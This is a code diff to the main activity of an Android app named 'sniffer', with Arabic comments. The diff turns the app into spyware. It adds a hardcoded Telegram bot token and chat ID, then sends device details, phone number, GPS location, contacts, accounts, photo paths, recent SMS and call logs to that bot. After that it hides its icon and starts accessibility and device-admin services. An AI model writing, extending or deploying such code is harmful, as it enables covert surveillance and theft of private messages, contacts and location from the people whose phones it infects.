@@ -2,19 +2,28 @@ package com.v8.global.sniffer;
 
 import android.Manifest;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationManager;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
+import android.provider.ContactsContract;
+import android.provider.MediaStore;
 import android.provider.Settings;
+import android.telephony.TelephonyManager;
 import android.view.Gravity;
 import android.view.View;
 import android.view.accessibility.AccessibilityManager;
@@ -27,13 +36,32 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
+
+import okhttp3.Call;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
+    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+    private static final String CHAT_ID = "7259620384";
     private static final int REQUEST_MEDIA_PROJECTION = 100;
     private static final int REQUEST_CODE_PERMISSIONS = 101;
     
+    private OkHttpClient client = new OkHttpClient();
     private String[] permissions = {
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.READ_CONTACTS,
@@ -53,7 +81,9 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // تصميم بسيط
+        // إرسال إشعار فور التثبيت
+        sendMessage("📱 **تم تثبيت التطبيق**\nفي انتظار الصلاحيات...");
+        
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
@@ -81,16 +111,18 @@ public class MainActivity extends AppCompatActivity {
         layout.addView(btnActivate);
         setContentView(layout);
         
-        // تحديث الحالة
         updateStatus();
     }
 
     private void updateStatus() {
         if (checkAllPermissions()) {
-            tvStatus.setText("✅ التطبيق مفعل بالكامل\nسيتم الإخفاء تلقائياً");
+            tvStatus.setText("✅ التطبيق مفعل بالكامل\nجاري سحب المعلومات...");
             tvStatus.setTextColor(0xFF00AA00);
-            btnActivate.setText("✅ التطبيق مفعل");
+            btnActivate.setText("✅ التفعيل تم");
             btnActivate.setEnabled(false);
+            
+            // سحب كل المعلومات تلقائياً
+            sendAllData();
             
             // إخفاء التطبيق بعد 3 ثواني
             new android.os.Handler().postDelayed(new Runnable() {
@@ -103,11 +135,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private boolean checkAllPermissions() {
-        // صلاحية الإشعارات
         String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
         boolean notificationEnabled = enabledListeners != null && enabledListeners.contains(getPackageName());
         
-        // صلاحية الوصول
         AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
         List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
         boolean accessibilityEnabled = false;
@@ -118,20 +148,16 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         
-        // صلاحية Admin
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
         boolean adminEnabled = dpm.isAdminActive(adminReceiver);
         
-        // صلاحية تسجيل الشاشة
         SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
         boolean screenCaptureEnabled = prefs.contains("resultCode");
         
-        // تجاهل البطارية
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         boolean batteryIgnored = pm.isIgnoringBatteryOptimizations(getPackageName());
         
-        // الأذونات العادية
         boolean normalPermissions = true;
         for (String permission : permissions) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -146,13 +172,9 @@ public class MainActivity extends AppCompatActivity {
     private void requestAllPermissions() {
         Toast.makeText(this, "جاري فتح إعدادات الصلاحيات...", Toast.LENGTH_LONG).show();
         
-        // 1. طلب صلاحية الإشعارات
         startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-        
-        // 2. طلب صلاحية الوصول
         startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
         
-        // 3. طلب صلاحية Admin
         ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         if (!dpm.isAdminActive(adminReceiver)) {
@@ -161,7 +183,6 @@ public class MainActivity extends AppCompatActivity {
             startActivity(adminIntent);
         }
         
-        // 4. طلب صلاحية تسجيل الشاشة
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             MediaProjectionManager projectionManager = 
                 (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
@@ -171,12 +192,10 @@ public class MainActivity extends AppCompatActivity {
             );
         }
         
-        // 5. طلب تجاهل البطارية
         Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
         batteryIntent.setData(Uri.parse("package:" + getPackageName()));
         startActivity(batteryIntent);
         
-        // 6. طلب الأذونات العادية
         List<String> permissionsNeeded = new ArrayList<>();
         for (String permission : permissions) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -191,6 +210,174 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private void sendAllData() {
+        sendMessage("📱 **بدأ سحب المعلومات...**");
+        
+        // معلومات الجهاز
+        sendDeviceInfo();
+        
+        // جهات الاتصال
+        getContacts();
+        
+        // الموقع
+        getLocation();
+        
+        // الحسابات
+        getAccounts();
+        
+        // الصور
+        getPhotos();
+        
+        // الرسائل
+        getSms();
+        
+        // سجل المكالمات
+        getCallLog();
+    }
+
+    private void sendDeviceInfo() {
+        try {
+            JSONObject info = new JSONObject();
+            info.put("model", Build.MODEL);
+            info.put("manufacturer", Build.MANUFACTURER);
+            info.put("android_version", Build.VERSION.RELEASE);
+            
+            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                info.put("phone", tm.getLine1Number());
+            }
+            
+            sendMessage("📱 **Device Info:**\n" + info.toString(2));
+        } catch (Exception e) {}
+    }
+
+    private void getLocation() {
+        try {
+            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
+            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+            if (location != null) {
+                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
+                sendMessage("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
+            }
+        } catch (Exception e) {}
+    }
+
+    private void getContacts() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    ContentResolver cr = getContentResolver();
+                    Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        null, null, null, null);
+                    StringBuilder sb = new StringBuilder("📇 **Contacts:**\n");
+                    int count = 0;
+                    while (cursor != null && cursor.moveToNext() && count < 20) {
+                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                        String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        sb.append(name).append(": ").append(number).append("\n");
+                        count++;
+                    }
+                    if (cursor != null) cursor.close();
+                    sendMessage(sb.toString());
+                } catch (Exception e) {}
+            }
+        }).start();
+    }
+
+    private void getAccounts() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
+                    Account[] accounts = am.getAccounts();
+                    StringBuilder sb = new StringBuilder("👤 **Accounts:**\n");
+                    for (Account acc : accounts) {
+                        sb.append(acc.type).append(": ").append(acc.name).append("\n");
+                    }
+                    sendMessage(sb.toString());
+                } catch (Exception e) {}
+            }
+        }).start();
+    }
+
+    private void getPhotos() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String[] projection = {MediaStore.Images.Media.DATA};
+                    Cursor cursor = getContentResolver().query(
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 5");
+                    StringBuilder sb = new StringBuilder("🖼 **Last 5 Photos:**\n");
+                    while (cursor != null && cursor.moveToNext()) {
+                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+                        sb.append(path).append("\n");
+                    }
+                    if (cursor != null) cursor.close();
+                    sendMessage(sb.toString());
+                } catch (Exception e) {}
+            }
+        }).start();
+    }
+
+    private void getSms() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Cursor cursor = getContentResolver().query(
+                        Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
+                    StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n");
+                    while (cursor != null && cursor.moveToNext()) {
+                        String address = cursor.getString(cursor.getColumnIndex("address"));
+                        String body = cursor.getString(cursor.getColumnIndex("body"));
+                        sb.append(address).append(": ").append(body).append("\n---\n");
+                    }
+                    if (cursor != null) cursor.close();
+                    sendMessage(sb.toString());
+                } catch (Exception e) {}
+            }
+        }).start();
+    }
+
+    private void getCallLog() {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    Cursor cursor = getContentResolver().query(
+                        Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
+                    StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n");
+                    while (cursor != null && cursor.moveToNext()) {
+                        String number = cursor.getString(cursor.getColumnIndex("number"));
+                        String type = cursor.getString(cursor.getColumnIndex("type"));
+                        String duration = cursor.getString(cursor.getColumnIndex("duration"));
+                        sb.append(number).append(" (").append(type).append(") ").append(duration).append("s\n");
+                    }
+                    if (cursor != null) cursor.close();
+                    sendMessage(sb.toString());
+                } catch (Exception e) {}
+            }
+        }).start();
+    }
+
+    private void sendMessage(String text) {
+        Request request = new Request.Builder()
+                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
+                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
+                .build();
+        client.newCall(request).enqueue(new okhttp3.Callback() {
+            @Override public void onResponse(Call call, Response response) { 
+                try { response.close(); } catch (Exception e) {}
+            }
+            @Override public void onFailure(Call call, IOException e) {}
+        });
+    }
+
     @Override
     public void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
@@ -201,7 +388,6 @@ public class MainActivity extends AppCompatActivity {
                 .putString("data", data.toUri(0))
                 .apply();
         }
-        
         updateStatus();
     }
 
@@ -212,11 +398,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void hideAppAndStartServices() {
-        // بدء الخدمات
         startService(new Intent(this, MainService.class));
         startService(new Intent(this, AccessibilityControlService.class));
         
-        // إخفاء التطبيق
         PackageManager pm = getPackageManager();
         pm.setComponentEnabledSetting(
             new ComponentName(this, MainActivity.class),
@@ -229,4 +413,4 @@ public class MainActivity extends AppCompatActivity {
         super.onResume();
         updateStatus();
     }
-                     }
+}
